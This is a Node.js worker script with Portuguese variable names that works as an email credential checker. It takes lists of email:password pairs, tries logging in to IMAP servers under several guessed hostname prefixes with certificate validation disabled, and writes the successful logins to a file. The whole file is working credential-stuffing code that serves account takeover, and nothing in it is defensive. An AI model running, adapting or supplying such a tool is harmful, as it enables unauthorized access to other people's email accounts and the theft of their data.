// worker.js
const { parentPort, workerData } = require("worker_threads");
const imaps = require("imap-simple");
const fs = require("fs");
const winston = require("winston");

const imapPrefixes = ["imap.", "mail.", "webmail.", "secure.", "imap.mail.", "imap.secure."];
const port = 993;

async function testarCredenciais(credenciais) {
  for (const credencial of credenciais) {
    const partes = credencial.split(":");
    if (partes.length < 2) continue;

    const email = partes[0].trim();
    const senha = partes.slice(1).join(":").trim();
    if (!email || !senha) continue;

    const dominio = email.split("@")[1];
    let sucesso = false;

    for (const prefix of imapPrefixes) {
      const host = `${prefix}${dominio}`;
      const config = {
        imap: {
          user: email,
          password: senha,
          host: host,
          port: port,
          tls: true,
          tlsOptions: { rejectUnauthorized: false },
          authTimeout: 20000,
        },
      };

      let connection;
      try {
        connection = await imaps.connect(config);
        sendSuccessMessage(prefix, port, email, senha);
        sucesso = true;
        break;
      } catch (err) {
        sendErrorMessage(email, senha, host, err.message);
      } finally {
        if (connection) {
          await connection.end();
        }
      }
    }

    if (!sucesso) {
      sendFailureMessage(email, senha);
    }
  }
}

function sendSuccessMessage(prefix, port, email, senha) {
  const message = `[SUCESSO] ${prefix}:${port}:${email}:${senha}`;
  parentPort.postMessage(message);
  fs.appendFile("sucesso.txt", `${message}\n`, (err) => {
    if (err) {
      winston.error(`Erro ao escrever no arquivo sucesso.txt: ${err.message}`);
    }
  });
}

function sendErrorMessage(email, senha, host, errorMessage) {
  const message = `[ERRO] ${email}:${senha} - Falha ao conectar em ${host} - ${errorMessage}`;
  parentPort.postMessage(message);
  winston.error(message);
}

function sendFailureMessage(email, senha) {
  const message = `[FALHA] ${email}:${senha} - Nenhuma conexão bem-sucedida.`;
  parentPort.postMessage(message);
  winston.error(message);
}

testarCredenciais(workerData);
